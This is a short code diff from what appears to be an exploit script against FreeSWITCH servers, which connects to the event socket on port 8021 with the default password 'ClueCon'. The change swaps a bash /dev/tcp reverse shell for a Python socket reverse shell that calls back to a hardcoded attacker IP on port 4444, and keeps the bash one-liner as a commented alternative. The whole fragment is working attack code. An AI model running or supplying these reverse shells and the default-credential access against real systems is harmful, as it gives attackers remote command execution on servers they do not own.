@@ -13,8 +13,10 @@ REVERSE_IP = '192.168.45.193'  # Attacker IP
 REVERSE_PORT = '4444'  # Attacker Port
 PASSWORD = 'ClueCon'  # Default password for FreeSWITCH
 
-# Define simpler reverse shell command
-CMD = f'/bin/bash -i >& /dev/tcp/{REVERSE_IP}/{REVERSE_PORT} 0>&1'
+# Try the Python reverse shell first
+CMD = f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{REVERSE_IP}",{REVERSE_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);\''
+# Alternatively, you can switch to the Bash reverse shell
+# CMD = f'bash -c "bash -i >& /dev/tcp/{REVERSE_IP}/{REVERSE_PORT} 0>&1"'
 
 s = socket(AF_INET, SOCK_STREAM)
 s.connect((ADDRESS, 8021))
